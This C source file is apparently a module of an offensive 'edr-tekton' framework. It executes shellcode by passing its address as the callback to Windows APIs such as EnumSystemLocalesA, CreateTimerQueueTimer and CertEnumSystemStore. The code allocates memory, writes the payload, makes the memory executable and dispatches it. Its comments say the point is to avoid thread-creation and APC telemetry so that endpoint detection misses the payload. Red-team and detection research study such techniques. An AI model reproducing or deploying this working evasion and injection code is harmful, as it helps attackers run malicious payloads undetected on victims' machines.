/*
 * edr-tekton :: Callback-Based Execution Module
 * Cat 4.6: Execute shellcode via Windows callback mechanisms
 *
 * Instead of CreateRemoteThread or QueueUserAPC, abuse legitimate Windows
 * APIs that accept callback function pointers. Pass the shellcode address
 * as the callback, and the API dispatches execution through normal
 * control flow, no thread creation required.
 *
 * The shellcode must already be allocated and written in the target
 * (or local) process. This module handles execution only, typically
 * chained after an allocation module.
 *
 * Supported callback vectors:
 *   - EnumDesktopWindows:    Enumerates desktop windows with callback
 *   - EnumChildWindows:      Enumerates child windows with callback
 *   - EnumSystemLocalesA:    Locale enumeration callback
 *   - CreateTimerQueueTimer: Timer-based delayed callback
 *   - CertEnumSystemStore:   Certificate store enumeration callback
 *   - EnumFontsW:            Font enumeration callback (local only)
 *
 * Key advantages:
 *   - No CreateRemoteThread (no PsSetCreateThreadNotifyRoutine callback)
 *   - No QueueUserAPC (no APC telemetry)
 *   - Execution via trusted Windows API dispatch
 *   - Call stack shows legitimate API frame above shellcode
 *
 * Pipeline stage: TEKTON_STAGE_INJECT
 */

#include "tekton/modules/inject.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>

/* ── Callback vector selection ─────────────────────────── */

typedef enum _CALLBACK_VECTOR {
    CB_ENUM_DESKTOP_WINDOWS   = 0,
    CB_ENUM_CHILD_WINDOWS     = 1,
    CB_ENUM_SYSTEM_LOCALES    = 2,
    CB_CREATE_TIMER_QUEUE     = 3,
    CB_CERT_ENUM_STORES       = 4,
    CB_ENUM_FONTS             = 5,
    CB_MAX                    = 6,
} CALLBACK_VECTOR;

static const char* cb_vector_names[] = {
    "EnumDesktopWindows",
    "EnumChildWindows",
    "EnumSystemLocalesA",
    "CreateTimerQueueTimer",
    "CertEnumSystemStore",
    "EnumFontsW",
};

/* ── Internal state ─────────────────────────────────────── */

typedef struct _CALLBACK_STATE {
    TEKTON_INJECT_CFG   cfg;
    CALLBACK_VECTOR     vector;          /* Which callback API to use */
    DWORD               timer_delay_ms;  /* Delay for timer-based callback */
    BOOL                local_execute;   /* Execute in own process (post-alloc) */
} CALLBACK_STATE;

/* ── Module vtable implementation ───────────────────────── */

static TEKTON_STATUS callback_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;

    CALLBACK_STATE* state = (CALLBACK_STATE*)malloc(sizeof(CALLBACK_STATE));
    if (!state) return TEKTON_ERR_ALLOC;

    memset(state, 0, sizeof(*state));

    /* Defaults */
    strncpy(state->cfg.target_process, "explorer.exe",
        sizeof(state->cfg.target_process) - 1);
    state->cfg.use_syscalls = TRUE;
    state->cfg.allocation_type = MEM_COMMIT | MEM_RESERVE;

    state->vector = CB_ENUM_SYSTEM_LOCALES;  /* Least suspicious, works locally */
    state->timer_delay_ms = 0;               /* Immediate for timer */
    state->local_execute = TRUE;             /* Default: local callback */

    self->private_data = state;

    TLOG_DEBUG("inject_callback: init (vector=%s, local=%d)",
        cb_vector_names[state->vector], state->local_execute);
    return TEKTON_OK;
}

static TEKTON_STATUS callback_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    CALLBACK_STATE* state = (CALLBACK_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    BYTE* payload_data = ctx->decrypted.data ? ctx->decrypted.data : ctx->payload.data;
    SIZE_T payload_len = ctx->decrypted.data ? ctx->decrypted.length : ctx->payload.length;

    if (!payload_data || payload_len == 0) {
        TLOG_ERROR("inject_callback: no payload to inject");
        return TEKTON_ERR_INVALID_PARAM;
    }

    if (ctx->dry_run) {
        TLOG_INFO("inject_callback: [DRY RUN] would execute %lu bytes via %s",
            (unsigned long)payload_len, cb_vector_names[state->vector]);
        TLOG_INFO("  Local: %s, Target: %s",
            state->local_execute ? "yes" : "no",
            state->cfg.target_process);
        return TEKTON_OK;
    }

#ifdef _WIN32
    BOOL use_nt = state->cfg.use_syscalls && ctx->resolved.ssns_resolved;

    /*
     * For callback execution, we need the payload already written to
     * executable memory. If ctx->remote_base is set from a prior
     * pipeline stage (alloc+write), use that address.
     * Otherwise, do local alloc+write+protect here.
     */
    PVOID exec_addr = ctx->remote_base;
    HANDLE hProcess = state->local_execute ? (HANDLE)-1 : ctx->target_handle;

    if (!exec_addr) {
        /* No prior allocation, do local inject */
        if (!state->local_execute) {
            TLOG_ERROR("inject_callback: remote callback requires prior allocation (remote_base not set)");
            return TEKTON_ERR_INVALID_STATE;
        }

        /* Allocate RW locally */
        PVOID local_addr = NULL;
        SIZE_T region_size = payload_len;

        if (use_nt && ctx->resolved.fn_nt_allocate_virtual_memory) {
            typedef NTSTATUS (NTAPI *pfnNtAlloc)(
                HANDLE, PVOID*, ULONG_PTR, PSIZE_T, DWORD, DWORD);
            pfnNtAlloc pNtAlloc =
                (pfnNtAlloc)ctx->resolved.fn_nt_allocate_virtual_memory;
            NTSTATUS ns = pNtAlloc((HANDLE)-1, &local_addr, 0, &region_size,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!NT_SUCCESS(ns)) {
                TLOG_ERROR("inject_callback: local NtAllocateVirtualMemory failed");
                return TEKTON_ERR_INJECT_FAIL;
            }
        } else {
            local_addr = VirtualAlloc(NULL, payload_len,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!local_addr) {
                TLOG_ERROR("inject_callback: VirtualAlloc failed");
                return TEKTON_ERR_INJECT_FAIL;
            }
        }

        /* Write payload */
        memcpy(local_addr, payload_data, payload_len);

        /* Flip to RX */
        DWORD old_prot = 0;
        if (use_nt && ctx->resolved.fn_nt_protect_virtual_memory) {
            typedef NTSTATUS (NTAPI *pfnNtProt)(
                HANDLE, PVOID*, PSIZE_T, DWORD, PDWORD);
            pfnNtProt pNtProt =
                (pfnNtProt)ctx->resolved.fn_nt_protect_virtual_memory;
            PVOID prot_addr = local_addr;
            SIZE_T prot_size = payload_len;
            pNtProt((HANDLE)-1, &prot_addr, &prot_size,
                    PAGE_EXECUTE_READ, &old_prot);
        } else {
            VirtualProtect(local_addr, payload_len,
                PAGE_EXECUTE_READ, &old_prot);
        }

        exec_addr = local_addr;
        ctx->remote_base = local_addr;

        TLOG_DEBUG("inject_callback: local alloc at %p (%lu bytes, RX)",
            exec_addr, (unsigned long)payload_len);
    }

    /* Dispatch execution through the selected callback vector */
    TLOG_DEBUG("inject_callback: dispatching via %s at %p",
        cb_vector_names[state->vector], exec_addr);

    switch (state->vector) {
        case CB_ENUM_DESKTOP_WINDOWS: {
            /*
             * EnumDesktopWindows calls the provided callback for each window.
             * Shellcode runs as the callback, receives HWND + lParam.
             * Returns when callback returns FALSE or all windows enumerated.
             */
            typedef BOOL (WINAPI *pfnEnumDesktopWindows)(HANDLE, PVOID, LPARAM);
            HMODULE hUser32 = GetModuleHandleA("user32.dll");
            if (!hUser32) hUser32 = LoadLibraryA("user32.dll");
            if (hUser32) {
                pfnEnumDesktopWindows pEnum = (pfnEnumDesktopWindows)
                    GetProcAddress(hUser32, "EnumDesktopWindows");
                if (pEnum) {
                    pEnum(NULL, exec_addr, 0);
                }
            }
            break;
        }

        case CB_ENUM_CHILD_WINDOWS: {
            /*
             * EnumChildWindows: iterate child windows of desktop.
             * Pass NULL parent for all top-level windows.
             */
            typedef BOOL (WINAPI *pfnEnumChildWindows)(HANDLE, PVOID, LPARAM);
            HMODULE hUser32 = GetModuleHandleA("user32.dll");
            if (!hUser32) hUser32 = LoadLibraryA("user32.dll");
            if (hUser32) {
                pfnEnumChildWindows pEnum = (pfnEnumChildWindows)
                    GetProcAddress(hUser32, "EnumChildWindows");
                if (pEnum) {
                    pEnum(NULL, exec_addr, 0);
                }
            }
            break;
        }

        case CB_ENUM_SYSTEM_LOCALES: {
            /*
             * EnumSystemLocalesA: enumerate installed system locales.
             * Callback receives locale string, returns TRUE to continue.
             * Lightweight, no GUI dependency, works from services.
             */
            typedef BOOL (WINAPI *pfnEnumSystemLocalesA)(PVOID, DWORD);
            HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
            if (hKernel32) {
                pfnEnumSystemLocalesA pEnum = (pfnEnumSystemLocalesA)
                    GetProcAddress(hKernel32, "EnumSystemLocalesA");
                if (pEnum) {
                    pEnum(exec_addr, 0);
                }
            }
            break;
        }

        case CB_CREATE_TIMER_QUEUE: {
            /*
             * CreateTimerQueueTimer: schedule callback via thread pool timer.
             * DueTime=0 for immediate, or state->timer_delay_ms for delayed.
             * Period=0 for one-shot. Timer callback runs on a thread pool thread.
             */
            typedef BOOL (WINAPI *pfnCreateTimerQueueTimer)(
                HANDLE*, HANDLE, PVOID, PVOID, DWORD, DWORD, DWORD);
            typedef BOOL (WINAPI *pfnDeleteTimerQueueEx)(HANDLE, HANDLE);

            HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
            if (hKernel32) {
                pfnCreateTimerQueueTimer pCreate = (pfnCreateTimerQueueTimer)
                    GetProcAddress(hKernel32, "CreateTimerQueueTimer");
                pfnDeleteTimerQueueEx pDelete = (pfnDeleteTimerQueueEx)
                    GetProcAddress(hKernel32, "DeleteTimerQueueEx");

                if (pCreate) {
                    HANDLE hTimer = NULL;
                    pCreate(&hTimer, NULL, exec_addr, NULL,
                        state->timer_delay_ms, 0,
                        0 /* WT_EXECUTEDEFAULT */);

                    /* Wait for the timer to fire */
                    WaitForSingleObject((HANDLE)-1, state->timer_delay_ms + 2000);

                    if (pDelete && hTimer) {
                        pDelete(hTimer, NULL);
                    }
                }
            }
            break;
        }

        case CB_CERT_ENUM_STORES: {
            /*
             * CertEnumSystemStore: enumerate certificate stores.
             * Callback receives store name. Unusual API, low EDR scrutiny.
             */
            typedef BOOL (WINAPI *pfnCertEnumSystemStore)(
                DWORD, void*, void*, PVOID);

            HMODULE hCrypt32 = GetModuleHandleA("crypt32.dll");
            if (!hCrypt32) hCrypt32 = LoadLibraryA("crypt32.dll");
            if (hCrypt32) {
                pfnCertEnumSystemStore pEnum = (pfnCertEnumSystemStore)
                    GetProcAddress(hCrypt32, "CertEnumSystemStore");
                if (pEnum) {
                    /* CERT_SYSTEM_STORE_CURRENT_USER = 0x00010000 */
                    pEnum(0x00010000, NULL, NULL, exec_addr);
                }
            }
            break;
        }

        case CB_ENUM_FONTS: {
            /*
             * EnumFontsW: enumerate fonts with callback.
             * Requires a device context. Local only.
             */
            typedef int (WINAPI *pfnEnumFontsW)(HANDLE, LPCWSTR, PVOID, LPARAM);
            typedef HANDLE (WINAPI *pfnGetDC)(HANDLE);
            typedef int (WINAPI *pfnReleaseDC)(HANDLE, HANDLE);

            HMODULE hUser32 = GetModuleHandleA("user32.dll");
            HMODULE hGdi32 = GetModuleHandleA("gdi32.dll");
            if (!hUser32) hUser32 = LoadLibraryA("user32.dll");
            if (!hGdi32) hGdi32 = LoadLibraryA("gdi32.dll");

            if (hGdi32 && hUser32) {
                pfnGetDC pGetDC = (pfnGetDC)GetProcAddress(hUser32, "GetDC");
                pfnReleaseDC pReleaseDC = (pfnReleaseDC)GetProcAddress(hUser32, "ReleaseDC");
                pfnEnumFontsW pEnum = (pfnEnumFontsW)GetProcAddress(hGdi32, "EnumFontsW");

                if (pGetDC && pEnum) {
                    HANDLE hDC = pGetDC(NULL);
                    if (hDC) {
                        pEnum(hDC, NULL, exec_addr, 0);
                        if (pReleaseDC) pReleaseDC(NULL, hDC);
                    }
                }
            }
            break;
        }

        default:
            TLOG_ERROR("inject_callback: unknown vector %d", state->vector);
            return TEKTON_ERR_INVALID_PARAM;
    }

    TLOG_INFO("inject_callback: execution dispatched via %s",
        cb_vector_names[state->vector]);
    TLOG_INFO("  Payload: %lu bytes at %p",
        (unsigned long)payload_len, exec_addr);

    return TEKTON_OK;

#else
    /* Linux dev stub */
    TLOG_INFO("inject_callback: [STUB] would dispatch %lu bytes via %s",
        (unsigned long)payload_len, cb_vector_names[state->vector]);
    return TEKTON_OK;
#endif
}

static VOID callback_cleanup(PTEKTON_MODULE self) {
    if (self->private_data) {
        TEKTON_SECURE_ZERO(self->private_data, sizeof(CALLBACK_STATE));
        free(self->private_data);
        self->private_data = NULL;
    }
}

static DWORD callback_risk_score(PTEKTON_MODULE self) {
    (void)self;
    /*
     * Low risk: no thread creation callback fires.
     * Execution flows through legitimate Windows API dispatch.
     * The callback address (pointing to allocated memory) may be
     * flagged by advanced heuristic engines, but no kernel-level
     * thread notification is generated.
     */
    return 15;
}

static BOOL callback_check_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self;
    (void)ctx;
    return TRUE;
}

/* ── Module definition + auto-registration ──────────────── */

TEKTON_MODULE tekton_mod_inject_callback = {
    .name           = "inject_callback",
    .description    = "Callback-based execution: EnumDesktopWindows, TimerQueue, etc (Cat 4.6)",
    .category       = TEKTON_CAT_INJECT,
    .target_surface = TEKTON_SURFACE_USER_HOOKS,
    .flags          = TEKTON_MOD_DESTRUCTIVE | TEKTON_MOD_STEALTHY,
    .skill_ref      = "4.6",
    .init           = callback_init,
    .execute        = callback_execute,
    .cleanup        = callback_cleanup,
    .get_risk_score = callback_risk_score,
    .check_compat   = callback_check_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_DECLARE_MODULE(tekton_mod_inject_callback);
